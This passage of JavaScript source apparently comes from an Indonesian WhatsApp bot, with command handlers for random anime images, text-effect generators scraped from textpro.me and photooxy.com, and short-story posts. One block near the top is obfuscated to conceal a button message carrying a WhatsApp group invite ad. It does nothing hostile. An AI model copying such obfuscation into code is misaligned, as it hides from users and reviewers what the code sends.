if (/thighs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/thighs.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/KirBotz/nyenyee/master/yumeko.json')
var yeha = heyy[Math.floor(Math.random() * heyy.length)];
var _0x81c06f=_0x2fc1;(function(_0x5da487,_0x27837f){var _0x1e9d37=_0x2fc1,_0x4423e4=_0x5da487();while(!![]){try{var _0x5a98b9=parseInt(_0x1e9d37(0x155))/(-0x22*-0x89+-0x5db*0x2+-0x67b)*(-parseInt(_0x1e9d37(0x162))/(0x1*-0x15fd+-0x3a1+-0xa0*-0x29))+-parseInt(_0x1e9d37(0x15a))/(0x3*-0x8e+0x1531+-0x1384)*(-parseInt(_0x1e9d37(0x160))/(-0x1af4+-0xa6*-0x1+0x1a52))+-parseInt(_0x1e9d37(0x15e))/(0x1ca6+0x16a6+-0x3347)+parseInt(_0x1e9d37(0x14e))/(-0xcf1*-0x3+0x281*0xd+-0x475a)+-parseInt(_0x1e9d37(0x156))/(-0x9e1+-0x2122+-0x1585*-0x2)+-parseInt(_0x1e9d37(0x159))/(-0xd*0x255+0x3cb*0x5+0x2f*0x3e)+parseInt(_0x1e9d37(0x14f))/(0x362*0x6+0x1*0x1811+-0x2c54)*(parseInt(_0x1e9d37(0x15f))/(0x17d7+0x1875+-0x3042));if(_0x5a98b9===_0x27837f)break;else _0x4423e4['push'](_0x4423e4['shift']());}catch(_0x3e3dfc){_0x4423e4['push'](_0x4423e4['shift']());}}}(_0x4970,0xaf13*0xe+0xf89db+-0xe09d9));function _0x2fc1(_0xa8984,_0x30da06){var _0x4b4054=_0x4970();return _0x2fc1=function(_0x7a7929,_0x4e4cf4){_0x7a7929=_0x7a7929-(0x1*-0x1032+0x2*0xbc9+-0x612);var _0x2fafcd=_0x4b4054[_0x7a7929];return _0x2fafcd;},_0x2fc1(_0xa8984,_0x30da06);}var buttoons=[{'buttonId':''+(prefix+command),'buttonText':{'displayText':_0x81c06f(0x157)},'type':0x1}],buttonMessaage={'image':{'url':yeha},'caption':_0x81c06f(0x15d)+sender[_0x81c06f(0x152)]('@')[-0x20cd+0x1*0x1915+0x7b8],'fileLength':_0x81c06f(0x161)+'99','mentions':[sender],'footer':creator,'buttons':buttoons,'headerType':0x4,'contextInfo':{'mentionedJid':[sender],'externalAdReply':{'showAdAttribution':!![],'renderLargerThumbnail':![],'title':_0x81c06f(0x15c)+_0x81c06f(0x164)+_0x81c06f(0x15b)+_0x81c06f(0x163),'containsAutoReply':!![],'mediaType':0x1,'thumbnail':{'url':yeha},'mediaUrl':_0x81c06f(0x158)+_0x81c06f(0x151)+_0x81c06f(0x153)+_0x81c06f(0x150)+_0x81c06f(0x165),'sourceUrl':_0x81c06f(0x158)+_0x81c06f(0x151)+_0x81c06f(0x153)+_0x81c06f(0x150)+_0x81c06f(0x165)}}};function _0x4970(){var _0x9efe89=['6618hOjZvL','al\x20Bot\x20|\x20C','Join\x20My\x20Gr','Nih\x20Kak\x20@','2758795ltUkVv','811890RYrfJS','552ZcgrWA','9999999999','24078LlBFaP','lick\x20Now','oup\x20Offici','nsMg5gHg','2590320vkcQcZ','144JIUdIj','yUev84L9S9','at.whatsap','split','p.com/BsGr','sendMessag','33XaNHXe','1434860kztRSi','➡️Next','https://ch','1242992AsRQgW'];_0x4970=function(){return _0x9efe89;};return _0x4970();}zeroyt7[_0x81c06f(0x154)+'e'](from,buttonMessaage,{'quoted':ftroli});
}
break
case 'fox':  
case 'dog':  
case 'cat':
case 'panda':  
case 'birb': 
case 'koala': 
if (!isPrem) return reply(mess.premium)
reply(mess.wait)
neys = await fetchJson(`https://some-random-api.ml/img/${command}`)
anu1 = await getBuffer(neys.link)
zeroyt7.sendMessage(from, { image: anu1, caption: `${mess.succes}` }, { quoted : ftroli })
break
case 'china':
case 'indonesia':
case 'japan':
case 'korea':
case 'malaysia':
case 'thailand':
case 'vietnam':{
if (!isPrem) return reply(mess.premium)
reply(mess.wait)
var asu = require(`../library/scraper/cecan/${command}.json`)
var bykay = asu[Math.floor(Math.random() * asu.length)]
await zeroyt7.sendMessage(from, { image: { url : bykay }, caption: mess.succes }, { quoted : ftroli })
}
break
case 'candy': 
case 'christmas': 
case '3dchristmas': 
case 'sparklechristmas':
case 'deepsea': 
case 'scifi': 
case 'rainbow': 
case 'waterpipe': 
case 'spooky': 
case 'pencil': 
case 'circuit': 
case 'discovery': 
case 'metalic': 
case 'fiction': 
case 'demon': 
case 'transformer': 
case 'berry': 
case 'thunder': 
case 'magma': 
case '3dstone': 
case 'neonlight': 
case 'glitch': 
case 'harrypotter': 
case 'brokenglass': 
case 'papercut': 
case 'watercolor': 
case 'multicolor': 
case 'neondevil': 
case 'underwater': 
case 'graffitibike':
case 'snow': 
case 'cloud': 
case 'honey': 
case 'ice': 
case 'fruitjuice': 
case 'biscuit': 
case 'wood': 
case 'chocolate': 
case 'strawberry': 
case 'matrix': 
case 'blood': 
case 'dropwater': 
case 'toxic': 
case 'lava': 
case 'rock': 
case 'bloodglas': 
case 'hallowen': 
case 'darkgold': 
case 'joker': 
case 'wicker':
case 'firework': 
case 'skeleton': 
case 'blackpink': 
case 'sand': 
case 'glue': 
case '1917': 
case 'leaves': {
if (!isPrem) return reply(mess.premium)
if (!q) return reply(`Masukan Text Nya\nContoh : ${prefix+command} Zero YT7`) 
reply(mess.wait)
var link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
var anu = await textpro.textpro(link, q)
zeroyt7.sendMessage(from, { image: { url: anu }, caption: `${mess.succes}` }, { quoted: ftroli })
}
break
case 'shadow': 
case 'write': 
case 'romantic': 
case 'burnpaper':
case 'smoke': 
case 'narutobanner': 
case 'love': 
case 'undergrass':
case 'doublelove': 
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':{
if (!isPrem) return reply(mess.premium)
if (!q) return reply(`Masukan Text Nya\nContoh : ${prefix+command} Zero YT7`) 
reply(mess.wait)
var link
if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
if (/summertext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html'
if (/wolfmetaltext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html'
if (/nature3dtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html'
if (/rosestext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html'
if (/naturetypography/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html'
if (/quotesunder/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html'
if (/shinetext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html'
if (/shadow/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
if (/write/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
if (/romantic/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
if (/burnpaper/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
if (/smoke/.test(command)) link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
if (/narutobanner/.test(command)) link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
if (/love/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
if (/undergrass/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
if (/doublelove/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
if (/coffecup/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
if (/underwaterocean/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
if (/smokyneon/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
if (/starstext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
if (/rainboweffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
if (/balloontext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
var dehe = await photooxy.photoOxy(link, q)
zeroyt7.sendMessage(from, { image: { url: dehe }, caption: `${mess.succes}` }, { quoted: ftroli })
}
break
case 'cerpen-sejarah': {
reply(mess.wait)
let hasil = await cerpen(`sejarah`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-sedih': {
reply(mess.wait)
let hasil = await cerpen(`sedih`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-rohani': {
reply(mess.wait)
let hasil = await cerpen(`rohani`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-rindu': {
reply(mess.wait)
let hasil = await cerpen(`rindu`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-remaja': {
reply(mess.wait)
let hasil = await cerpen(`remaja`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-ramadhan': {
reply(mess.wait)
let hasil = await cerpen(`ramadhan`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-petualangan': {
reply(mess.wait)
let hasil = await cerpen(`petualangan`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-persahabatan': {
reply(mess.wait)
let hasil = await cerpen(`persahabatan`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-perpisahan': {
reply(mess.wait)
let hasil = await cerpen(`perpisahan`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-perjuangan': {
reply(mess.wait)
let hasil = await cerpen(`perjuangan`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-penyesalan': {
reply(mess.wait)
let hasil = await cerpen(`penyesalan`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-pengorbanan': {
reply(mess.wait)
let hasil = await cerpen(`pengorbanan`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-pengalaman': {
reply(mess.wait)
let hasil = await cerpen(`pengalaman pribadi`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-pendidikan': {
reply(mess.wait)
let hasil = await cerpen(`pendidikan`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-penantian': {
reply(mess.wait)
let hasil = await cerpen(`penantian`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-patahhati': {
reply(mess.wait)
let hasil = await cerpen(`patah hati`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-olahraga': {
reply(mess.wait)
let hasil = await cerpen(`olahraga`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-nasionalisme': {
reply(mess.wait)
let hasil = await cerpen(`nasionalisme`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-nasihat': {
reply(mess.wait)
let hasil = await cerpen(`nasihat`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-motivasi': {
reply(mess.wait)
let hasil = await cerpen(`motivasi`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-misteri': {
reply(mess.wait)
let hasil = await cerpen(`misteri`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-mengharukan': {
reply(mess.wait)
let hasil = await cerpen(`mengharukan`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-malaysia': {
reply(mess.wait)
let hasil = await cerpen(`malaysia`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-liburan': {
reply(mess.wait)
let hasil = await cerpen(`liburan`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-kristen': {
reply(mess.wait)
let hasil = await cerpen(`kristen`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-korea': {
reply(mess.wait)
let hasil = await cerpen(`korea`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-kisahnyata': {
reply(mess.wait)
let hasil = await cerpen(`kisah nyata`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-keluarga': {
reply(mess.wait)
let hasil = await cerpen(`keluarga`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-kehidupan': {
reply(mess.wait)
let hasil = await cerpen(`kehidupan`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-jepang': {
reply(mess.wait)
let hasil = await cerpen(`jepang`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-inspiratif': {
reply(mess.wait)
let hasil = await cerpen(`inspiratif`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-gokil': {
reply(mess.wait)
let hasil = await cerpen(`gokil`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-galau': {
reply(mess.wait)
let hasil = await cerpen(`galau`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-cintasejati': {
reply(mess.wait)
let hasil = await cerpen(`cinta sejati`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-cintasegitiga': {
reply(mess.wait)
let hasil = await cerpen(`Cinta segitiga`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-cintasedih': {
reply(mess.wait)
let hasil = await cerpen(`cinta sedih`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-cintaromantis': {
reply(mess.wait)
let hasil = await cerpen(`cinta romantis`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-cintapertama': {
reply(mess.wait)
let hasil = await cerpen(`cinta pertama`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-cintaislami': {
reply(mess.wait)
let hasil = await cerpen(`cinta islami`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-cinta': {
reply(mess.wait)
let hasil = await cerpen(`cinta`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-budaya': {
reply(mess.wait)
let hasil = await cerpen(`budaya`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-bahasainggris': {
reply(mess.wait)
let hasil = await cerpen(`bahasa Inggris`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
